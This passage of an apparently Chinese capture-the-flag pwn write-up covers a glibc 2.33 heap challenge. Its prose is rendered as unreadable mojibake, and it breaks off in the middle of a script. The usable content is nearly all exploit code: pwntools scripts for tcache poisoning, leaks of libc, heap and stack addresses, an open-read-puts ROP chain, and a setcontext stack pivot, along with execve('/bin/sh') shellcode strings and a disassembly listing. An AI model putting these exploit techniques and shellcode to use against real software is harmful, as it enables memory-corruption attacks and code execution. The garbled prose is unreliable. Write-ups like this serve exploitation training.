class="hljs-string">&quot;\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span><br>sh_x86_20=<span class="hljs-string">&quot;\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span><br>sh_x64_21=<span class="hljs-string">&quot;\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05&quot;</span><br><span class="hljs-comment">#https://www.exploit-db.com/shellcodes</span><br><br><span class="hljs-comment">#------------------------------------------------------------------------------------------------------#</span><br><span class="hljs-comment"># set solib-search-path /home/zyy/glibc-all-in-one/libs/2.33-0ubuntu5_amd64/</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>():<br>sla(<span class="hljs-string">&quot;Choice: &quot;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>sla(<span class="hljs-string">&quot;Choice: &quot;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>sla(<span class="hljs-string">&quot;Idx: &quot;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>sla(<span class="hljs-string">&quot;Choice: &quot;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>sla(<span class="hljs-string">&quot;Idx: &quot;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">size, index, context</span>):<br>sla(<span class="hljs-string">&quot;Choice: &quot;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>sla(<span class="hljs-string">&quot;Idx: &quot;</span>, <span class="hljs-built_in">str</span>(index))<br>sla(<span class="hljs-string">&quot;Size: &quot;</span>, <span class="hljs-built_in">str</span>(size))<br>sa(<span class="hljs-string">&quot;Content: &quot;</span>, context)<br><br><span class="hljs-comment"># fill tcache</span><br>add() <span class="hljs-comment"># 0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>add() <span class="hljs-comment"># 1 - 7</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>delete(i+<span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># leak libc</span><br>delete(<span class="hljs-number">0</span>)<br>edit(<span class="hljs-number">9</span>, <span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">9</span>)<span class="hljs-comment"># LOWORD(fd)=0x00,fill fd-&gt;LOWORD(bk)</span><br>show(<span class="hljs-number">0</span>)<span class="hljs-comment"># leak bk</span><br>libc_base = uu64() - <span class="hljs-number">0x1e0c61</span><br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>)<br>environ = libc_base + libc.sym[<span class="hljs-string">&#x27;environ&#x27;</span>]<br>op = libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>rd = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>pt = libc_base + libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>lg(<span class="hljs-string">&#x27;environ&#x27;</span>)<br>pop_rdi = libc_base + <span class="hljs-number">0x0000000000028a55</span><br>pop_rsi = libc_base + <span class="hljs-number">0x000000000002a4cf</span><br>pop_rdx_r12 = libc_base + <span class="hljs-number">0x0000000000112a51</span><br><br><span class="hljs-comment"># leak tcache</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>add()<span class="hljs-comment"># 8 - 13</span><br>show(<span class="hljs-number">1</span>)<br>sh.recv()<br><span class="hljs-built_in">next</span> = u64(sh.recv(<span class="hljs-number">5</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>lg(<span class="hljs-string">&#x27;next&#x27;</span>)<br><br><span class="hljs-comment"># leak stack</span><br>fake_next = <span class="hljs-built_in">next</span> ^ environ<br>delete(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">8</span>, <span class="hljs-number">2</span>, p64(fake_next))<br>add() <span class="hljs-comment"># 14</span><br>add() <span class="hljs-comment"># 15</span><br>show(<span class="hljs-number">15</span>)<br>leak_stack = uu64()<br>lg(<span class="hljs-string">&#x27;leak_stack&#x27;</span>)<br>fake_addr = leak_stack - <span class="hljs-number">0x110</span><br>lg(<span class="hljs-string">&#x27;fake_addr&#x27;</span>)<br><br><span class="hljs-comment"># make rop</span><br>delete(<span class="hljs-number">8</span>)<br>delete(<span class="hljs-number">9</span>)<br>fake_next = <span class="hljs-built_in">next</span> ^ fake_addr<br>edit(<span class="hljs-number">8</span>, <span class="hljs-number">9</span>, p64(fake_next))<br>add() <span class="hljs-comment"># 16</span><br><span class="hljs-comment"># dbg()</span><br>add() <span class="hljs-comment"># 17</span><br><br>owr = <span class="hljs-string">b&#x27;flag\x00&#x27;</span><br>owr = owr.ljust(<span class="hljs-number">0x18</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>owr += p64(pop_rdi) + p64(fake_addr) + p64(op)<br>owr += p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(fake_addr + <span class="hljs-number">0x100</span>) + p64(pop_rdx_r12) + p64(<span class="hljs-number">0x30</span>)*<span class="hljs-number">2</span> + p64(rd)<br>owr += p64(pop_rdi) + p64(fake_addr + <span class="hljs-number">0x100</span>) + p64(pt)<br>edit(<span class="hljs-built_in">len</span>(owr), <span class="hljs-number">17</span>, owr)<br>sh.recv()<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><h3 id="setcontext"><a href="#setcontext" class="headerlink" title="setcontext"></a>setcontext</h3><p>è¿™é“é¢˜ç›®æ˜¯libc2.33çš„ï¼Œè¿˜æœªç¦ç”¨hookå‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥è¦†ç›–hookå‡½æ•°ä¸ºlibcä¸­çš„setcontextï¼Œå®ç°owrã€‚</p><blockquote><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://blog.csdn.net/A951860555/article/details/118268484">(8æ¡æ¶ˆæ¯) pwné¢˜å †åˆ©ç”¨çš„ä¸€äº›å§¿åŠ¿ â€“ setcontext___lifanxinçš„åšå®¢-CSDNåšå®¢_setcontext</a></p></blockquote><p>åœ¨è¿™é‡Œå¯ä»¥ç”¨IDAæŸ¥çœ‹setcontextä¸­çš„å†…å®¹ï¼Œè¿™é‡Œæˆ‘ä»¬éœ€è¦çš„æ±‡ç¼–ç‰‡æ®µçš„åç§»æ˜¯0x3dï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000052970</span> F3 0F 1E FA                   endbr64<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000052974</span> <span class="hljs-number">57</span>                            <span class="hljs-keyword">push</span>    <span class="hljs-built_in">rdi</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000052975</span> <span class="hljs-number">48</span> <span class="hljs-number">8D</span> B7 <span class="hljs-number">28</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>          <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rsi</span>, [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">128h</span>]       <span class="hljs-comment">; nset</span><br><span class="hljs-symbol">.text:</span>000000000005297C <span class="hljs-number">31</span> D2                         <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">edx</span>, <span class="hljs-built_in">edx</span>              <span class="hljs-comment">; oset</span><br><span class="hljs-symbol">.text:</span>000000000005297E BF <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>                <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">edi</span>, <span class="hljs-number">2</span>                <span class="hljs-comment">; how</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000052983</span> <span class="hljs-number">41</span> BA <span class="hljs-number">08</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>             <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r10d</span>, <span class="hljs-number">8</span>               <span class="hljs-comment">; sigsetsize</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000052989</span> B8 0E <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>                <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-number">0Eh</span><br><span class="hljs-symbol">.text:</span>000000000005298E 0F <span class="hljs-number">05</span>                         <span class="hljs-keyword">syscall</span>                       <span class="hljs-comment">; LINUX - sys_rt_sigprocmask</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000052990</span> 5A                            <span class="hljs-keyword">pop</span>     <span class="hljs-built_in">rdx</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000052991</span> <span class="hljs-number">48</span> <span class="hljs-number">3D</span> <span class="hljs-number">01</span> F0 FF FF             <span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">rax</span>, <span class="hljs-number">0FFFFFFFFFFFFF001h</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000052997</span> 0F <span class="hljs-number">83</span> <span class="hljs-number">22</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>             <span class="hljs-keyword">jnb</span>     loc_52ABF<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000052997</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000005299D</span> <span class="hljs-number">48</span> 8B 8A E0 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>          <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rcx</span>, [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0E0h</span>]<br><span class="hljs-symbol">.text:</span>00000000000529A4 D9 <span class="hljs-number">21</span>                         <span class="hljs-keyword">fldenv</span>  <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rcx</span>]<br><span class="hljs-symbol">.text:</span>00000000000529A6 0F AE <span class="hljs-number">92</span> C0 <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>          <span class="hljs-keyword">ldmxcsr</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">1C0h</span>]<br><span class="hljs-symbol">.text:</span>00000000000529AD <span class="hljs-number">48</span> 8B A2 A0 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>          <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rsp</span>, [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0A0h</span>]# å˜¿ï¼Œæˆ‘åœ¨è¿™é‡Œï¼ï¼<br><span class="hljs-symbol">.text:</span>00000000000529B4 <span class="hljs-number">48</span> 8B 9A <span class="hljs-number">80</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>          <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rbx</span>, [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">80h</span>]<br><span class="hljs-symbol">.text:</span>00000000000529BB <span class="hljs-number">48</span> 8B 6A <span class="hljs-number">78</span>                   <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rbp</span>, [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">78h</span>]<br><span class="hljs-symbol">.text:</span>00000000000529BF 4C 8B <span class="hljs-number">62</span> <span class="hljs-number">48</span>                   <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r12</span>, [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">48h</span>]<br><span class="hljs-symbol">.text:</span>00000000000529C3 4C 8B 6A <span class="hljs-number">50</span>                   <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r13</span>, [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">50h</span>]<br><span class="hljs-symbol">.text:</span>00000000000529C7 4C 8B <span class="hljs-number">72</span> <span class="hljs-number">58</span>                   <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r14</span>, [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">58h</span>]<br><span class="hljs-symbol">.text:</span>00000000000529CB 4C 8B 7A <span class="hljs-number">60</span>                   <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r15</span>, [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">60h</span>]<br><span class="hljs-symbol">.text:</span>00000000000529CF <span class="hljs-number">64</span> F7 <span class="hljs-number">04</span> <span class="hljs-number">25</span> <span class="hljs-number">48</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">02</span> <span class="hljs-number">00</span>+<span class="hljs-keyword">test</span>    <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">fs</span>:<span class="hljs-number">48h</span>, <span class="hljs-number">2</span><br><span class="hljs-symbol">.text:</span>00000000000529CF <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-symbol">.text:</span>00000000000529<span class="hljs-built_in">DB</span> 0F <span class="hljs-number">84</span> B5 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>             <span class="hljs-keyword">jz</span>      loc_52A96<br><span class="hljs-symbol"></span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">.text:</span>0000000000052A96                               loc_52A96:                    <span class="hljs-comment">; CODE XREF: setcontext+6Bâ†‘j</span><br><span class="hljs-symbol">.text:</span>0000000000052A96 <span class="hljs-number">48</span> 8B 8A A8 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>          <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rcx</span>, [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0A8h</span>]<br><span class="hljs-symbol">.text:</span>0000000000052A9D <span class="hljs-number">51</span>                            <span class="hljs-keyword">push</span>    <span class="hljs-built_in">rcx</span><br><span class="hljs-symbol">.text:</span>0000000000052A9E <span class="hljs-number">48</span> 8B <span class="hljs-number">72</span> <span class="hljs-number">70</span>                   <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rsi</span>, [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">70h</span>]<br><span class="hljs-symbol">.text:</span>0000000000052AA2 <span class="hljs-number">48</span> 8B 7A <span class="hljs-number">68</span>                   <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">68h</span>]<br><span class="hljs-symbol">.text:</span>0000000000052AA6 <span class="hljs-number">48</span> 8B 8A <span class="hljs-number">98</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>          <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rcx</span>, [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">98h</span>]<br><span class="hljs-symbol">.text:</span>0000000000052<span class="hljs-keyword">AAD</span> 4C 8B <span class="hljs-number">42</span> <span class="hljs-number">28</span>                   <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r8</span>, [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">28h</span>]<br><span class="hljs-symbol">.text:</span>0000000000052AB1 4C 8B 4A <span class="hljs-number">30</span>                   <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r9</span>, [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">30h</span>]<br><span class="hljs-symbol">.text:</span>0000000000052AB5 <span class="hljs-number">48</span> 8B <span class="hljs-number">92</span> <span class="hljs-number">88</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>          <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rdx</span>, [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">88h</span>]<br><span class="hljs-symbol">.text:</span>0000000000052AB5                               <span class="hljs-comment">; &#125; // starts at 52970</span><br><span class="hljs-symbol">.text:</span>0000000000052ABC                               <span class="hljs-comment">; __unwind &#123;</span><br><span class="hljs-symbol">.text:</span>0000000000052ABC <span class="hljs-number">31</span> C0                         <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">.text:</span>0000000000052ABE C3                            <span class="hljs-keyword">retn</span><br><span class="hljs-symbol">.text:</span>0000000000052ABE<br></code></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼šè¿™é‡Œå’Œä¸Šé¢ç»™çš„å‚è€ƒæ–‡ç« æœ‰åŒºåˆ«ï¼Œä¸€æ˜¯åç§»ä¸ä¸€æ ·ï¼Œå¦å¤–æœ€é‡è¦çš„æ˜¯ï¼Œæœ¬äººç»™å‡ºçš„æ±‡ç¼–æ˜¯ä»¥rdxä¸ºåŸºç¡€å»æ‰¾åç§»ï¼Œè€Œå‚è€ƒæ–‡ç« æ˜¯ä»¥rdiä¸ºåŸºç¡€å»æ‰¾åç§»ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸€æ®µgadgetå°†rdiä¸­çš„å€¼è½¬åŒ–ä¸ºrdxï¼Œå¹¶ä¸”æˆ‘ä»¬è¿˜éœ€è¦æ§åˆ¶ç¨‹åºæ‰§è¡Œæµæ‰§è¡Œsetcontextã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">ROPgadget --binary libc.so.6 --only &#x27;mov|call&#x27; | grep rdx<br>æ‰¾åˆ°ä»¥ä¸‹ä¸€ä¸ªç‰‡æ®µï¼š<br>mov rdx, dword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]<br></code></pre></td></tr></table></figure><p>å¯ä»¥é¦–å…ˆè¦†ç›–hookå‡½æ•°ä¸ºè¿™ä¸€æ®µgadgetï¼Œç„¶åé€šè¿‡æ§åˆ¶mallocå’Œfreeå †å—å…¶ä¸­å†…å®¹çš„å¸ƒå±€ï¼Œä½¿å¾—ä¸‹ä¸€æ¬¡<code>call qword ptr [rdx + 0x20]</code>çš„æ—¶å€™èƒ½å¤Ÿæ‰§è¡Œæˆ‘ä»¬çš„setcontextï¼ŒåŒæ—¶åŸºäºrdxå¸ƒç½®å¥½æˆ‘ä»¬çš„orwï¼Œå°¤å…¶è¦æ³¨æ„rspçš„å˜åŒ–ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#encoding = utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>)<br><br>local = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> local == <span class="hljs-number">1</span> :<br>sh = process([<span class="hljs-string">b&quot;./ld.so&quot;</span>, <span class="hljs-string">b&quot;./pwn&quot;</span>], env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : <span class="hljs-string">b&quot;./libc.so.6&quot;</span>&#125;)<br><span class="hljs-keyword">elif</span> local == <span class="hljs-number">2</span> :<br>    sh = process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><span class="hljs-keyword">else</span> :<br>sh = remote(ip, port)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>():<br>    gdb.attach(sh)<br>    pause()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">slibc</span>(<span class="hljs-params">leak_name, leak_addr, flag = <span class="hljs-number">0</span></span>):<br>    <span class="hljs-keyword">if</span> flag == <span class="hljs-number">0</span> :<br>        libc_base = leak_addr - libc.symbols[<span class="hljs-built_in">str</span>(leak_name)]<br>        sys_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>        bin_sh = libc_base + libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>).__next__()<br><br>    <span class="hljs-keyword">else</span> :<br>        libcsch = LibcSearcher(<span class="hljs-built_in">str</span>(leak_name), leak_addr)<br>        libc_base = leak_addr - libcsch.dump(<span class="hljs-built_in">str</span>(leak_name))<br>        sys_addr = libc_base + libcsch.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>        bin_sh = libc_base + libcsch.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br>    <span class="hljs-keyword">return</span> [sys_addr, bin_sh]<br><br>s       = <span class="hljs-keyword">lambda</span> data               :sh.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> text, data         :sh.sendafter(text, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :sh.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> text, data         :sh.sendlineafter(text, data)<br>r       = <span class="hljs-keyword">lambda</span> num                :sh.recv(num)<br>ru      = <span class="hljs-keyword">lambda</span> text               :sh.recvuntil(text)<br>uu32    = <span class="hljs-keyword">lambda</span>                    :u32(sh.recvuntil(<span class="hljs-string">&quot;\xf7&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span>                    :u64(sh.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>lg      = <span class="hljs-keyword">lambda</span> s                  :sh.success(<span class="hljs-string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br><br>sh_x86_18=<span class="hljs-string">&quot;\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span><br>sh_x86_20=<span class="hljs-string">&quot;\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span><br>sh_x64_21=<span class="hljs-string">&quot;\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05&quot;</span><br><span class="hljs-comment">#https://www.exploit-db.com/shellcodes</span><br><br><span class="hljs-comment">#------------------------------------------------------------------------------------------------------#</span><br><span class="hljs-comment"># set solib-search-path /home/zyy/glibc-all-in-one/libs/2.33-0ubuntu5_amd64/</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>():<br>sla(<span class="hljs-string">&quot;Choice: &quot;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>sla(<span class="hljs-string">&quot;Choice: &quot;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>sla(<span class="hljs-string">&quot;Idx: &quot;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>sla(<span class="hljs-string">&quot;Choice: &quot;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>sla(<span class="hljs-string">&quot;Idx: &quot;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">size, index, context</span>):<br>sla(<span class="hljs-string">&quot;Choice: &quot;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>sla(<span class="hljs-string">&quot;Idx: &quot;</span>, <span class="hljs-built_in">str</span>(index))<br>sla(<span class="hljs-string">&quot;Size: &quot;</span>, <span class="hljs-built_in">str</span>(size))<br>sa(<span class="hljs-string">&quot;Content: &quot;</span>, context)<br><br><span class="hljs-comment"># fill tcache</span><br>add() <span class="hljs-comment"># 0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>add() <span class="hljs-comment"># 1 - 7</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>delete(i+<span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># leak libc</span><br>delete(<span class="hljs-number">0</span>)<br>edit(<span class="hljs-number">9</span>, <span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">9</span>)<span class="hljs-comment"># LOWORD(fd)=0x00,fill fd-&gt;LOWORD(bk)</span><br>show(<span class="hljs-number">0</span>)<span class="hljs-comment"># leak bk</span><br>libc_base = uu64() - <span 